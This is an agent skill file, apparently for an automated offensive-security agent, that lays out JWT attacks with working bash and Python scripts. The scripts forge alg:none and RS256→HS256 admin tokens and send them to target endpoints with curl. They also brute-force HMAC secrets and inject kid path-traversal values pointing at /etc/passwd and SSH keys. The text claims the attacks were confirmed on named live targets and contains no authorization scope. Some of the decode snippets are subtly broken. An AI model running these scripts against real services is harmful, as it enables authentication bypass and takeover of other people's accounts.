---
name: jwt-attack
description: 当出现 Bearer 认证头时，对 JWT 进行解码、伪造与暴力破解。
version: 1.1.0
revision_date: 2026-07-25
license: MIT
platforms: [linux]
compatibility: Requires curl, python3
metadata:
  tags: [recon, JWT, token, forge, brute-force]
  category: recon
  related_skills:
    - api-noauth-hunt
    - js-secrets-extraction
    - hunt-firebase
    - hunt-supabase
---

# JWT 攻击技能

完整的 JWT 攻击方法论 —— 不校验签名直接解码、算法混淆（alg:none、RS256→HS256）、弱密钥暴力破解（hashcat/john/简易脚本）、kid 注入、过期令牌复用，以及从 JS 打包文件中提取硬编码 JWT。已在 enterprise-portal（基于 JWT 的会话）、fintech-processor（Efí 银行日志中的 315 个 JWT 令牌）、fitness-chain（3 个 2027 年过期的 JWT 会话）、delivery-platform（JS 打包文件中的硬编码 JWT）以及 gov-finance-portal（Vite 源码中泄露的 JWT 密钥）上得到确认。

## When to Use

- API 使用 `Authorization: Bearer eyJ...` 请求头。
- JavaScript 打包文件中包含 `eyJ...` 形式的令牌。
- 在 `js-secrets-extraction` 发现 JWT 令牌之后。
- 在 `api-noauth-hunt` 需要伪造令牌以绕过认证时。
- Cookie 中包含 `jwt=`、`token=` 或 `session=` 且取值为 base64 编码。

## Prerequisites

- 具备 curl、python3 的 `terminal`。
- 待攻击的 JWT 令牌（来自侦察）。
- 暴力破解需要：`hashcat` 或 `john` 用于高速破解（可选）。

## How to Run

```bash
# Decode JWT without verification
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U" | python3 -c "
import sys, base64, json
parts = sys.stdin.read().strip().split('.')
if len(parts) == 3:
    for i, part in enumerate(parts[:2]):
        try:
            padded = part + '=' * (4 - len(part) % 4)
            decoded = base64.urlsafe_b64decode(padded)
            print(f'--- Part {i} ---')
            print(json.dumps(json.loads(decoded), indent=2))
        except: print(f'Part {i}: {part[:50]}... (non-JSON)')
"

# Test alg:none attack
python3 -c "
import base64, json
header = base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=').decode()
payload = base64.urlsafe_b64encode(json.dumps({'admin':True,'sub':'admin'}).encode()).rstrip(b'=').decode()
print(f'{header}.{payload}.')
"
```

## 快速参考

| 攻击手法 | 前置条件 | 影响 | 难度 |
|--------|-------------|--------|------------|
| alg:none | 服务端接受 `alg: "none"` | 完整管理员权限 | 简单 |
| RS256→HS256 | JWT 使用 RS256 签名 | 完整管理员权限 | 中等（需要公钥） |
| 弱 HMAC 密钥 | HS256 使用弱密钥 | 完整管理员权限 | 中等（需要破解） |
| kid 注入 | 服务端信任 `kid` 请求头 | RCE/LFI | 困难 |
| 过期令牌复用 | 服务端不校验 `exp` | 会话持久化 | 极简 |
| 硬编码 JWT | 在 JS/源码中发现 JWT | 该 JWT 所授予的全部权限 | 极简 |

## Procedure

### 阶段 1 — JWT 解码与分析

```bash
JWT="$1"

echo "[*] JWT analysis"

# Split and decode
HEADER=$(echo "$JWT" | cut -d. -f1)
PAYLOAD=$(echo "$JWT" | cut -d. -f2)
SIGNATURE=$(echo "$JWT" | cut -d. -f3)

echo "Header:"
echo "$HEADER" | python3 -c "
import sys, base64, json
padded = sys.stdin.read().strip() + '=' * (4 - len(sys.stdin.read().strip()) % 4)
try:
    d = json.loads(base64.urlsafe_b64decode(padded))
    print(json.dumps(d, indent=2))
except: print('  (not valid base64 JSON)')
"

echo "Payload:"
echo "$PAYLOAD" | python3 -c "
import sys, base64, json
padded = sys.stdin.read().strip() + '=' * (4 - len(sys.stdin.read().strip()) % 4)
try:
    d = json.loads(base64.urlsafe_b64decode(padded))
    for k, v in d.items():
        if k in ('exp', 'iat', 'nbf'):
            from datetime import datetime, timezone
            dt = datetime.fromtimestamp(v, tz=timezone.utc)
            print(f'  {k}: {v} ({dt})')
        else:
            print(f'  {k}: {v}')
except: print('  (not valid base64 JSON)')
"

# Check expiration
EXP=$(echo "$JWT" | cut -d. -f2 | python3 -c "
import sys, base64, json
padded = sys.stdin.read().strip() + '=' * (4 - len(sys.stdin.read().strip()) % 4)
d = json.loads(base64.urlsafe_b64decode(padded))
print(d.get('exp', 'no-expiry'))
" 2>/dev/null)

if [[ "$EXP" == "no-expiry" ]]; then
  echo "[!] Token has NO expiration — permanent access"
else
  NOW=$(date +%s)
  if [[ "$EXP" -gt "$NOW" ]]; then
    REMAINING=$((EXP - NOW))
    DAYS=$((REMAINING / 86400))
    echo "[+] Token valid for ${DAYS} more days (expires $(date -d @$EXP))"
  else
    echo "[-] Token EXPIRED $(date -d @$EXP)"
  fi
fi
```

### 阶段 2 — alg:none 攻击

```bash
TARGET="$1"
ENDPOINT="$2"    # Authenticated endpoint to test
ORIGINAL_JWT="$3"  # Any valid JWT to extract claims from

echo "[*] alg:none attack"

# Extract payload from original JWT
PAYLOAD=$(echo "$ORIGINAL_JWT" | cut -d. -f2)

# Forge token with alg=none
FORGED_HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
FORGED_TOKEN="${FORGED_HEADER}.${PAYLOAD}."

echo "  Forged token: ${FORGED_TOKEN:0:80}..."

# Test
RESP=$(curl -sk --max-time 10 --connect-timeout 10 "$TARGET$ENDPOINT" \
  -H "Authorization: Bearer $FORGED_TOKEN" \
  -o /dev/null -w "%{http_code}" 2>/dev/null)

if [[ "$RESP" == "200" ]]; then
  echo "  [CRITICAL] alg:none ACCEPTED — full admin access!"
else
  echo "  [-] alg:none rejected (HTTP $RESP)"
fi
```

### 阶段 3 — RS256→HS256 密钥混淆

```bash
TARGET="$1"
ENDPOINT="$2"
PUBLIC_KEY_FILE="$3"  # RSA public key (PEM), from /.well-known/jwks.json or source leak

echo "[*] RS256→HS256 key confusion attack"

# Convert public key to symmetric key (the attack: HS256 uses the PUBLIC key as HMAC secret)
JWT_TOOL=$(python3 -c "
import jwt, sys

# Read public key
with open('$PUBLIC_KEY_FILE') as f:
    pubkey = f.read()

# Forge admin token
payload = {'admin': True, 'sub': 'admin', 'iat': $(date +%s)}
try:
    forged = jwt.encode(payload, pubkey, algorithm='HS256')
    print(forged)
except Exception as e:
    print(f'Error: {e}', file=sys.stderr)
" 2>/dev/null)

if [[ -n "$JWT_TOOL" ]] && ! echo "$JWT_TOOL" | grep -q "Error"; then
  echo "  Forged token: ${JWT_TOOL:0:80}..."
  RESP=$(curl -sk --max-time 10 --connect-timeout 10 "$TARGET$ENDPOINT" \
    -H "Authorization: Bearer $JWT_TOOL" \
    -o /dev/null -w "%{http_code}" 2>/dev/null)
  [[ "$RESP" == "200" ]] && echo "  [CRITICAL] RS256→HS256 confusion ACCEPTED!"
else
  echo "  [-] Forging failed (check public key format)"
fi
```

### 阶段 4 — 弱 HMAC 密钥暴力破解

```bash
JWT="$1"
WORDLIST="${2:-/usr/share/wordlists/rockyou.txt}"

echo "[*] Quick HS256 secret brute force"

# Fast Python brute force (top 1000 passwords)
echo "$JWT" | python3 -c "
import sys, hmac, hashlib, base64, json

jwt = sys.stdin.read().strip()
header_b64, payload_b64, sig_b64 = jwt.split('.')
header = json.loads(base64.urlsafe_b64decode(header_b64 + '=='))

if header.get('alg') != 'HS256':
    print('[-] Not HS256 — algorithm is:', header.get('alg'))
    sys.exit(0)

# Top secrets to try
secrets = ['secret', 'jwt_secret', 'key', 'password', 'admin', 'changeme',
           'SuperSecret', 'mysecretkey', '123456', 'jwt', 'token',
           'app_secret', 'secret_key', 'auth_token', 'private_key']

for secret in secrets:
    sig = base64.urlsafe_b64encode(
        hmac.new(secret.encode(), f'{header_b64}.{payload_b64}'.encode(), hashlib.sha256).digest()
    ).rstrip(b'=').decode()
    if sig == sig_b64:
        print(f'[CRACKED] Secret: {secret}')
        break
else:
    print('[-] Not in top-15 list')

# Also try from wordlist (first 5000 lines)
try:
    with open('$WORDLIST', 'rb') as f:
        for i, line in enumerate(f):
            if i >= 5000: break
            secret = line.strip()
            sig = base64.urlsafe_b64encode(
                hmac.new(secret, f'{header_b64}.{payload_b64}'.encode(), hashlib.sha256).digest()
            ).rstrip(b'=').decode()
            if sig == sig_b64:
                print(f'[CRACKED from wordlist] Secret: {secret.decode()}')
                break
    else:
        print('[-] Not in first 5000 wordlist entries')
except FileNotFoundError:
    print('[-] Wordlist not found at $WORDLIST')
"
```

### 阶段 5 — Kid 注入（路径穿越 / SQLi）

```bash
TARGET="$1"
ENDPOINT="$2"

echo "[*] kid header injection test"

# Test path traversal in kid header
for KID in "../../../../etc/passwd" "../../.ssh/id_rsa" "file:///etc/passwd"; do
  FORGED_HEADER=$(echo -n "{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"$KID\"}" | base64 -w0 | tr '+/' '-_' | tr -d '=')
  FORGED_TOKEN="${FORGED_HEADER}.$(echo -n '{"test":1}' | base64 -w0 | tr '+/' '-_' | tr -d '=').dGVzdA"

  RESP=$(curl -sk --max-time 5 --connect-timeout 5 "$TARGET$ENDPOINT" \
    -H "Authorization: Bearer $FORGED_TOKEN" \
    -o /dev/null -w "%{http_code}" 2>/dev/null)

  [[ "$RESP" == "500" ]] && echo "  [POTENTIAL] kid=$KID → HTTP $RESP (server error — may indicate processing)"
  sleep 0.3
done
```

## Pitfalls

- **alg:none 很罕见。** 自 2017 年起，大多数 JWT 库默认拒绝它。但遗留应用仍然存在。
- **RS256→HS256 需要公钥。** 公钥通常可从 `/.well-known/jwks.json` 或 JS 打包文件中获得。
- **Python 暴力破解很慢。** 对 HS256 使用 `hashcat -m 16500`，或用 `john` 做生产级速度的破解。
- **Laravel Passport 使用 `jti` 校验。** 即使你伪造出合法的 JWT，Passport 仍会检查 `jti`（JWT ID）是否存在于数据库中。
- **Auth0/Firebase 使用 JWKS。** 服务端从 `/.well-known/jwks.json` 获取公钥 —— alg:none 不会生效，因为服务端始终用公钥验证。

## Verification

- alg:none：伪造的令牌必须能访问受保护资源并返回 HTTP 200。
- RS256→HS256：伪造的令牌必须能通过服务端以公钥作为 HMAC 密钥的验证。
- HS256 暴力破解：破解出的密钥必须能为修改后的载荷生成有效签名。
- 硬编码 JWT：必须用该令牌测试 API，确认其仍然有效。
- Kid 注入：对于注入的 kid 与无效签名，服务端必须返回不同的错误（表明服务端处理了 kid）。
